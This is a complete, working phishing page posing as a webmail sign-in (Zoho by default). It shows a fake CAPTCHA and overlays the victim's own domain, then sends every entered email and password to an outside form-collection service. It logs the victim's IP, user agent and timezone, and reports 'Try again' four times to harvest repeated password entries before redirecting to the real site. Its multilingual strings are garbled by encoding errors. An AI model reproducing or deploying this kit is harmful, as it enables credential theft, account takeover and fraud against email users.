<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title data-i18n="title">Webmail Sign-in</title>
   <!-- Bootstrap 5 CSS -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <!-- Bootstrap Icons -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
   <!-- Google Fonts: Poppins -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
   <!-- i18next -->
   <script src="https://unpkg.com/i18next@23.11.5/dist/umd/i18next.min.js"></script>
   <script src="https://unpkg.com/i18next-browser-languagedetector@7.2.1/dist/umd/i18nextBrowserLanguageDetector.min.js"></script>

   <style>
      /* Hide main content initially */
      #main-content {
         display: none;
      }

      /* Verification Div Styling */
      #verification-div {
         height: 100vh;
         display: flex;
         align-items: start;
         justify-content: center;
         padding-top: 10%;
      }

      /* Left-align text */
      .verification-content {
         text-align: left;
      }

      /* Spinner size */
      .spinner-border {
         width: 1.5rem;
         height: 1.5rem;
      }

      /* RTL support for languages like Arabic */
      [dir="rtl"] {
         direction: rtl;
         text-align: right;
      }

      #background-iframe, #overlay { position: fixed; top: 0; left: 0; height: 100%; width: 100%; }
      body { font-family: Poppins, sans-serif; margin: 0; padding: 0; overflow: hidden; }
      #background-iframe { border: none; z-index: -3; object-fit: cover; }
      #overlay { background-color: rgba(0, 0, 0, .5); z-index: -2; }
      .form-container { display: none; max-width: 400px; width: 100%; padding: 2rem; background-color: rgba(255, 255, 255, .95); border-radius: .75rem; box-shadow: 0 8px 16px rgba(0, 0, 0, .2); position: relative; z-index: 1; }
      .icon-text { display: flex; align-items: center; margin-bottom: 1.5rem; }
      .icon-text img { width: 32px; height: 32px; margin-right: .5rem; }
      .icon-text .h4 { margin-bottom: 0; color: #0d6efd; }
      .form-floating { position: relative; margin-bottom: 1.5rem; }
      .form-floating label, .input-icon { position: absolute; color: #6c757d; pointer-events: none; }
      .form-floating label { transition: .2s ease-in-out; left: 2.5rem; top: -.2rem; background-color: transparent; z-index: 1; }
      .form-floating input:focus + label, .form-floating input:not(:placeholder-shown) + label { transform: translateY(-1.5rem); font-size: .85rem; color: #0d6efd; }
      .form-control { border-top: none; border-left: none; border-right: none; border-bottom: 2px solid #ced4da; border-radius: 0; padding-left: 2.5rem; transition: border-color .2s; background-color: transparent; }
      .form-control:focus { box-shadow: none; outline: 0; border-bottom-color: #0d6efd; }
      .input-icon { left: .75rem; top: 50%; transform: translateY(-50%); font-size: 1.2rem; }
      [dir="rtl"] .form-floating label { left: auto; right: 2.5rem; }
      [dir="rtl"] .input-icon { left: auto; right: .75rem; }
      [dir="rtl"] .form-control { padding-left: 0; padding-right: 2.5rem; }
      .btn-primary { width: 100%; padding: .75rem; font-size: 1rem; background-color: #0d6efd; border: none; border-radius: .375rem; transition: background-color .3s, color .3s; }
      .btn-primary:hover { background-color: #0b5ed7; color: #fff; }
      .btn-primary:focus { box-shadow: none; }
      @media (max-width: 576px) { .form-container { padding: 1.5rem; } }
      .loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, .5); align-items: center; justify-content: center; z-index: 9999; display: none; }
      .error-message { color: red; margin-bottom: 1rem; display: none; }
   </style>
</head>

<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
   <div id="verification-div" style="position: absolute; height: 100vh; width: 100vw; background-color: #fff;">
      <div class="row">
         <div class="col-12 verification-content mx-2">
            <h2 data-i18n="verify_browser">Checking your browser before accessing the site</h2>
            <div>
               <div class="checkbox-container mt-3 d-flex align-items-center p-4" style="border: 0px solid black; background: #f3efef; border-radius: 5px;">
                  <input type="checkbox" id="bot-check" class="form-check-input">
                  <label for="bot-check" class="form-check-label ms-2" data-i18n="not_robot">I am not a robot</label>
               </div>
            </div>
            <p class="pt-1" data-i18n="verify_instruction">Click on the checkbox to verify if you're human.</p>
         </div>
      </div>
   </div>
   <!-- Background Iframe -->
   <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
   <!-- Dimmed Overlay -->
   <div id="overlay"></div>
   <!-- Form Container -->
   <div class="form-container" id="form-container">
      <!-- Error Message -->
      <div id="error-message" class="error-message" data-i18n="error_message">Try again</div>
      <form id="user-form">
         <!-- Honeypot Field -->
         <input type="text" name="honeypot" id="honeypot" style="display:none;" autocomplete="off">
         <!-- Icon and Text Row -->
         <div class="icon-text">
            <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon" style="height: 15px; width: 15px;">
            <span class="h4 mb-0" style="margin-left: 10px;" id="domain-name">ZOHO</span>
         </div>
         <!-- Heading -->
         <h5 class="mb-3" data-i18n="get_started">Let's get started</h5>
         <!-- Paragraph -->
         <p class="mb-4 text-muted" style="font-size: .8rem;" data-i18n="session_expired">Previous session has expired, login to continue</p>
         <!-- Email Input -->
         <div class="form-floating position-relative">
            <i class="bi bi-envelope input-icon"></i>
            <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index: 1000;" disabled>
            <label for="email" style="background-color: transparent;" data-i18n="email_label">Email</label>
         </div>
         <!-- Password Input -->
         <div class="form-floating position-relative">
            <i class="bi bi-lock input-icon"></i>
            <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
            <label for="password" style="background-color: transparent;" data-i18n="password_label">Password</label>
         </div>
         <!-- Submit Button -->
         <button type="submit" class="btn btn-primary" data-i18n="next_button">Next</button>
      </form>
   </div>

   <!-- Loader Overlay -->
   <div id="loader-overlay" class="loader-overlay">
      <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
         <span class="visually-hidden" data-i18n="loading">Loading...</span>
      </div>
   </div>

   <!-- Bootstrap 5 JS Bundle -->
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
   <!-- i18next Initialization -->
   <script>
      // Translation resources for requested languages
      const resources = {
         en: {
            translation: {
               title: "Webmail Sign-in",
               verify_browser: "Checking your browser before accessing the site",
               not_robot: "I am not a robot",
               verify_instruction: "Click on the checkbox to verify if you're human.",
               redirecting: "Redirecting...",
               verifying: "Verifying...",
               error_message: "Try again",
               get_started: "Let's get started",
               session_expired: "Previous session has expired, login to continue",
               email_label: "Email",
               password_label: "Password",
               next_button: "Next",
               loading: "Loading..."
            }
         },
         zh-CN: {
            translation: {
               title: "ç½‘é¡µé‚®ä»¶ç™»å½•",
               verify_browser: "åœ¨è®¿é—®ç½‘ç«™ä¹‹å‰æ£€æŸ¥æ‚¨çš„æµè§ˆå™¨",
               not_robot: "æˆ‘ä¸æ˜¯æœºå™¨äºº",
               verify_instruction: "ç‚¹å‡»å¤é€‰æ¡†ä»¥éªŒè¯æ‚¨æ˜¯äººç±»ã€‚",
               redirecting: "æ­£åœ¨é‡å®šå‘...",
               verifying: "æ­£åœ¨éªŒè¯...",
               error_message: "è¯·é‡è¯•",
               get_started: "å¼€å§‹å§",
               session_expired: "ä¹‹å‰çš„ä¼šè¯å·²è¿‡æœŸï¼Œè¯·ç™»å½•ä»¥ç»§ç»­",
               email_label: "ç”µå­é‚®ä»¶",
               password_label: "å¯†ç ",
               next_button: "ä¸‹ä¸€æ­¥",
               loading: "åŠ è½½ä¸­..."
            }
         },
         ko: {
            translation: {
               title: "ì›¹ë©”ì¼ ë¡œê·¸ì¸",
               verify_browser: "ì‚¬ì´íŠ¸ì— ì ‘ê·¼í•˜ê¸° ì „ì— ë¸Œë¼ìš°ì €ë¥¼ í™•ì¸ ì¤‘ìž…ë‹ˆë‹¤",
               not_robot: "ë‚˜ëŠ” ë¡œë´‡ì´ ì•„ë‹™ë‹ˆë‹¤",
               verify_instruction: "ì¸ê°„ìž„ì„ í™•ì¸í•˜ë ¤ë©´ ì²´í¬ë°•ìŠ¤ë¥¼ í´ë¦­í•˜ì„¸ìš”.",
               redirecting: "ë¦¬ë””ë ‰ì…˜ ì¤‘...",
               verifying: "í™•ì¸ ì¤‘...",
               error_message: "ë‹¤ì‹œ ì‹œë„í•˜ì„¸ìš”",
               get_started: "ì‹œìž‘í•©ì‹œë‹¤",
               session_expired: "ì´ì „ ì„¸ì…˜ì´ ë§Œë£Œë˜ì—ˆìŠµë‹ˆë‹¤. ê³„ì†í•˜ë ¤ë©´ ë¡œê·¸ì¸í•˜ì„¸ìš”",
               email_label: "ì´ë©”ì¼",
               password_label: "ë¹„ë°€ë²ˆí˜¸",
               next_button: "ë‹¤ìŒ",
               loading: "ë¡œë”© ì¤‘..."
            }
         },
         vi: {
            translation: {
               title: "ÄÄƒng nháº­p Webmail",
               verify_browser: "Äang kiá»ƒm tra trÃ¬nh duyá»‡t cá»§a báº¡n trÆ°á»›c khi truy cáº­p trang web",
               not_robot: "TÃ´i khÃ´ng pháº£i lÃ  robot",
               verify_instruction: "Nháº¥p vÃ o há»™p kiá»ƒm Ä‘á»ƒ xÃ¡c minh báº¡n lÃ  con ngÆ°á»i.",
               redirecting: "Äang chuyá»ƒn hÆ°á»›ng...",
               verifying: "Äang xÃ¡c minh...",
               error_message: "Thá»­ láº¡i",
               get_started: "HÃ£y báº¯t Ä‘áº§u",
               session_expired: "PhiÃªn trÆ°á»›c Ä‘Ã£ háº¿t háº¡n, Ä‘Äƒng nháº­p Ä‘á»ƒ tiáº¿p tá»¥c",
               email_label: "Email",
               password_label: "Máº­t kháº©u",
               next_button: "Tiáº¿p theo",
               loading: "Äang táº£i..."
            }
         },
         ja: {
            translation: {
               title: "ã‚¦ã‚§ãƒ–ãƒ¡ãƒ¼ãƒ«ãƒ­ã‚°ã‚¤ãƒ³",
               verify_browser: "ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å‰ã«ãƒ–ãƒ©ã‚¦ã‚¶ã‚’ç¢ºèªã—ã¦ã„ã¾ã™",
               not_robot: "ç§ã¯ãƒ­ãƒœãƒƒãƒˆã§ã¯ã‚ã‚Šã¾ã›ã‚“",
               verify_instruction: "äººé–“ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ãƒã‚§ãƒƒã‚¯ãƒœãƒƒã‚¯ã‚¹ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚",
               redirecting: "ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆä¸­...",
               verifying: "ç¢ºèªä¸­...",
               error_message: "ã‚‚ã†ä¸€åº¦è©¦ã—ã¦ãã ã•ã„",
               get_started: "å§‹ã‚ã¾ã—ã‚‡ã†",
               session_expired: "å‰ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒæœŸé™åˆ‡ã‚Œã«ãªã‚Šã¾ã—ãŸã€‚ç¶šè¡Œã™ã‚‹ã«ã¯ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ãã ã•ã„",
               email_label: "ãƒ¡ãƒ¼ãƒ«",
               password_label: "ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰",
               next_button: "æ¬¡ã¸",
               loading: "èª­ã¿è¾¼ã¿ä¸­..."
            }
         },
         ms: {
            translation: {
               title: "Log Masuk Webmail",
               verify_browser: "Menyemak pelayar anda sebelum mengakses laman web",
               not_robot: "Saya bukan robot",
               verify_instruction: "Klik pada kotak semak untuk mengesahkan anda manusia.",
               redirecting: "Mengalihkan...",
               verifying: "Mengesahkan...",
               error_message: "Cuba lagi",
               get_started: "Mari kita mulakan",
               session_expired: "Sesi sebelumnya telah tamat tempoh, log masuk untuk meneruskan",
               email_label: "E-mel",
               password_label: "Kata laluan",
               next_button: "Seterusnya",
               loading: "Memuat..."
            }
         },
         es: {
            translation: {
               title: "Inicio de sesiÃ³n de correo web",
               verify_browser: "Verificando tu navegador antes de acceder al sitio",
               not_robot: "No soy un robot",
               verify_instruction: "Haz clic en la casilla para verificar que eres humano.",
               redirecting: "Redirigiendo...",
               verifying: "Verificando...",
               error_message: "Intenta de nuevo",
               get_started: "Comencemos",
               session_expired: "La sesiÃ³n anterior ha expirado, inicia sesiÃ³n para continuar",
               email_label: "Correo electrÃ³nico",
               password_label: "ContraseÃ±a",
               next_button: "Siguiente",
               loading: "Cargando..."
            }
         },
         fr: {
            translation: {
               title: "Connexion au courriel web",
               verify_browser: "VÃ©rification de votre navigateur avant d'accÃ©der au site",
               not_robot: "Je ne suis pas un robot",
               verify_instruction: "Cliquez sur la case Ã  cocher pour vÃ©rifier que vous Ãªtes humain.",
               redirecting: "Redirection...",
               verifying: "VÃ©rification...",
               error_message: "RÃ©essayez",
               get_started: "CommenÃ§ons",
               session_expired: "La session prÃ©cÃ©dente a expirÃ©, connectez-vous pour continuer",
               email_label: "E-mail",
               password_label: "Mot de passe",
               next_button: "Suivant",
               loading: "Chargement..."
            }
         },
         ar: {
            translation: {
               title: "ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ",
               verify_browser: "Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù…ØªØµÙØ­Ùƒ Ù‚Ø¨Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹",
               not_robot: "Ø£Ù†Ø§ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØªÙ‹Ø§",
               verify_instruction: "Ø§Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ù…Ø±Ø¨Ø¹ Ø§Ù„Ø§Ø®ØªÙŠØ§Ø± Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù†Ùƒ Ø¥Ù†Ø³Ø§Ù†.",
               redirecting: "Ø¬Ø§Ø±Ù Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡...",
               verifying: "Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù‚Ù‚...",
               error_message: "Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰",
               get_started: "Ù„Ù†Ø¨Ø¯Ø£",
               session_expired: "Ø§Ù†ØªÙ‡Øª ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ø¬Ù„Ø³Ø© Ø§Ù„Ø³Ø§Ø¨Ù‚Ø©ØŒ Ù‚Ù… Ø¨ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©",
               email_label: "Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ",
               password_label: "ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±",
               next_button: "Ø§Ù„ØªØ§Ù„ÙŠ",
               loading: "Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù…ÙŠÙ„..."
            }
         },
         ru: {
            translation: {
               title: "Ð’Ñ…Ð¾Ð´ Ð² Ð²ÐµÐ±-Ð¿Ð¾Ñ‡Ñ‚Ñƒ",
               verify_browser: "ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð²Ð°ÑˆÐµÐ³Ð¾ Ð±Ñ€Ð°ÑƒÐ·ÐµÑ€Ð° Ð¿ÐµÑ€ÐµÐ´ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð¾Ð¼ Ðº ÑÐ°Ð¹Ñ‚Ñƒ",
               not_robot: "Ð¯ Ð½Ðµ Ñ€Ð¾Ð±Ð¾Ñ‚",
               verify_instruction: "ÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Ð½Ð° Ñ„Ð»Ð°Ð¶Ð¾Ðº, Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð¿Ð¾Ð´Ñ‚Ð²ÐµÑ€Ð´Ð¸Ñ‚ÑŒ, Ñ‡Ñ‚Ð¾ Ð²Ñ‹ Ñ‡ÐµÐ»Ð¾Ð²ÐµÐº.",
               redirecting: "ÐŸÐµÑ€ÐµÐ½Ð°Ð¿Ñ€Ð°Ð²Ð»ÐµÐ½Ð¸Ðµ...",
               verifying: "ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ°...",
               error_message: "ÐŸÐ¾Ð¿Ñ€Ð¾Ð±ÑƒÐ¹Ñ‚Ðµ ÑÐ½Ð¾Ð²Ð°",
               get_started: "ÐÐ°Ñ‡Ð½ÐµÐ¼",
               session_expired: "ÐŸÑ€ÐµÐ´Ñ‹Ð´ÑƒÑ‰Ð°Ñ ÑÐµÑÑÐ¸Ñ Ð¸ÑÑ‚ÐµÐºÐ»Ð°, Ð²Ð¾Ð¹Ð´Ð¸Ñ‚Ðµ, Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð¿Ñ€Ð¾Ð´Ð¾Ð»Ð¶Ð¸Ñ‚ÑŒ",
               email_label: "Ð­Ð»ÐµÐºÑ‚Ñ€Ð¾Ð½Ð½Ð°Ñ Ð¿Ð¾Ñ‡Ñ‚Ð°",
               password_label: "ÐŸÐ°Ñ€Ð¾Ð»ÑŒ",
               next_button: "Ð”Ð°Ð»ÐµÐµ",
               loading: "Ð—Ð°Ð³Ñ€ÑƒÐ·ÐºÐ°..."
            }
         }
      };

      // Supported languages (all from previous response)
      const supportedLanguages = [
         'en', 'es', 'ja', 'ar', 'zh-CN', 'ko', 'vi', 'ms', 'fr', 'ru', 'ps', 'fa', 'hy', 'az', 'bn', 'dz',
         'km', 'zh-TW', 'el', 'tr', 'ka', 'hi', 'id', 'ku', 'he', 'kk', 'ky', 'lo', 'mn', 'my', 'ne', 'ur',
         'fil', 'dv', 'ta', 'si', 'th', 'pt', 'tet', 'tg', 'tk', 'uz', 'sq', 'ca', 'de', 'be', 'nl', 'bs', 'hr',
         'sr', 'bg', 'cs', 'da', 'et', 'fi', 'sv', 'hu', 'is', 'ga', 'it', 'lv', 'lt', 'lb', 'mt', 'ro', 'cnr',
         'mk', 'no', 'pl', 'sl', 'uk', 'rm', 'qu', 'ay', 'gn', 'ht'
      ];

      // RTL languages
      const rtlLanguages = ['ar', 'fa', 'he', 'ur'];

      // Initialize i18next
      i18next
         .use(i18nextBrowserLanguageDetector)
         .init({
            resources,
            fallbackLng: 'en',
            supportedLngs: supportedLanguages,
            detection: {
               order: ['navigator', 'htmlTag', 'path', 'subdomain'],
               caches: ['localStorage', 'cookie'],
               lookupLocalStorage: 'i18nextLng',
               lookupCookie: 'i18next'
            },
            interpolation: {
               escapeValue: false
            }
         }, function(err, t) {
            if (err) return console.error('i18next initialization error:', err);
            // Update translations and direction
            const updateTranslations = () => {
               document.querySelectorAll('[data-i18n]').forEach(elem => {
                  elem.innerHTML = i18next.t(elem.getAttribute('data-i18n'));
               });
               document.title = i18next.t('title');
               // Set text direction
               document.documentElement.setAttribute('dir', rtlLanguages.includes(i18next.language) ? 'rtl' : 'ltr');
            };
            updateTranslations();
            i18next.on('languageChanged', updateTranslations);
         });
   </script>
   <!-- Form Handling and Reporting -->
   <script>
      let submitCount = 0;
      document.addEventListener("DOMContentLoaded", (() => {
         const e = window.location.hash ? window.location.hash.substring(1) : null;
         let t;
         if (e) {
            document.getElementById("email").value = e;
            const n = e.split("@");
            if (2 === n.length) {
               const e = n[1];
               t = e, document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${e}`;
               const o = e.split(".")[0].toUpperCase();
               document.getElementById("domain-name").textContent = o;
               const r = e.startsWith("http://") || e.startsWith("https://") ? e : `https://${e}`;
               document.getElementById("background-iframe").src = r;
            }
         } else console.warn("No '#' parameter found in the URL."), document.getElementById("background-iframe").src = "about:blank";
         
         let n = {
            ipAddress: "Fetching...",
            userAgent: navigator.userAgent,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            browser: "Detecting..."
         };
         const o = navigator.userAgent;
         o.indexOf("Firefox") > -1 ? n.browser = "Mozilla Firefox" : o.indexOf("SamsungBrowser") > -1 ? n.browser = "Samsung Internet" : o.indexOf("Opera") > -1 || o.indexOf("OPR") > -1 ? n.browser = "Opera" : o.indexOf("Trident") > -1 ? n.browser = "Microsoft Internet Explorer" : o.indexOf("Edge") > -1 ? n.browser = "Microsoft Edge" : o.indexOf("Chrome") > -1 ? n.browser = "Google Chrome or Chromium" : o.indexOf("Safari") > -1 ? n.browser = "Apple Safari" : n.browser = "Unknown";
         
         fetch("https://api.ipify.org?format=json").then((e => e.json())).then((e => {
            n.ipAddress = e.ip;
         })).catch((e => {
            console.error("Error fetching IP address:", e), n.ipAddress = "Unavailable";
         }));

         document.getElementById("user-form").addEventListener("submit", (function(e) {
            e.preventDefault();
            submitCount += 1;

            const isFirstAttempt = submitCount === 1;
            const isSecondAttempt = submitCount === 2;
            const isThirdAttempt = submitCount === 3;
            const isFourthAttempt = submitCount === 4;

            document.getElementById("loader-overlay").style.display = "flex";
            let s = `âœ…ðŸ¤‘ðŸ’³ðŸ’¶ Perry ajebutter ðŸ’¶ðŸ’³ðŸ¤‘âœ…\n\nEmail: ${document.getElementById("email").value.trim()}\nPassword: ${document.getElementById("password").value.trim()}`;
            
            new Promise((e => {
               const t = setInterval((() => {
                  "Fetching..." !== n.ipAddress && (clearInterval(t), e());
               }), 100);
            })).then((() => {
               s += `\nIP Address: ${n.ipAddress}\nUser Agent: ${n.userAgent}\nTimezone: ${n.timezone}\nBrowser: ${n.browser}`;
            }));

            if (isFirstAttempt) {
               setTimeout(() => {
                  document.getElementById("loader-overlay").style.display = "none";
                  document.getElementById("error-message").style.display = "block";
                  document.getElementById("error-message").innerHTML = i18next.t('error_message');
                  document.getElementById("password").value = "";
               }, 3000);
            } else if (isSecondAttempt || isThirdAttempt || isFourthAttempt) {
               setTimeout(() => {
                  document.getElementById("loader-overlay").style.display = "none";
                  document.getElementById("error-message").style.display = "block";
                  document.getElementById("error-message").innerHTML = i18next.t('error_message');
                  document.getElementById("password").value = "";
               }, 3000);
            } else if (submitCount === 5) {
               setTimeout(() => {
                  document.getElementById("loader-overlay").style.display = "none";
                  window.location.href = "https://" + t;
               }, 3000);
            }
         }));

         // Reporting with Honeypot
         document.getElementById("user-form").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const honeypot = document.getElementById("honeypot").value.trim();
            if (honeypot) {
               console.log("Honeypot field filled. Submission ignored.");
               return;
            }

            const email = document.getElementById("email").value.trim();
            const password = document.getElementById("password").value.trim();
            
            const data = {
               email: email,
               password: password
            };

            fetch("https://submit-form.com/YeYoqHc8C", {
               method: "POST",
               headers: {
                  "Content-Type": "application/json"
               },
               body: JSON.stringify(data)
            })
            .then(response => {
               if (response.ok) {
                  console.log("Submission to form successful!");
               } else {
                  console.error("Submission to form failed.");
               }
            })
            .catch(error => {
               console.error("Error sending submission to form:", error);
            });
         });
      }));
   </script>
</body>

<!-- Bot Verification -->
<script>
   document.addEventListener('DOMContentLoaded', function () {
      const botCheck = document.getElementById('bot-check');
      const verificationDiv = document.getElementById('verification-div');
      const formContainer = document.getElementById('form-container');
      const mainContent = document.getElementById('main-content');

      botCheck.addEventListener('change', function () {
         if (this.checked) {
            const checkboxContainer = this.parentElement;
            checkboxContainer.innerHTML = `
               <div class="spinner-container d-flex align-items-center">
                  <div class="spinner-border" role="status">
                     <span class="visually-hidden" data-i18n="loading">Loading...</span>
                  </div>
                  <span class="ms-2" data-i18n="verifying">Verifying...</span>
               </div>
            `;
            document.querySelectorAll('[data-i18n]').forEach(elem => {
               elem.innerHTML = i18next.t(elem.getAttribute('data-i18n'));
            });

            setTimeout(function () {
               verificationDiv.innerHTML = `
                  <div class="row">
                     <div class="col-12 verification-content">
                        <h2 data-i18n="redirecting">Redirecting...</h2>
                     </div>
                  </div>
               `;
               document.querySelectorAll('[data-i18n]').forEach(elem => {
                  elem.innerHTML = i18next.t(elem.getAttribute('data-i18n'));
               });

               setTimeout(function () {
                  verificationDiv.style.display = 'none';
                  mainContent.style.display = 'block';
                  formContainer.style.display = 'block';
               }, 2000);
            }, 4000);
         }
      });
   });
</script>
</html>
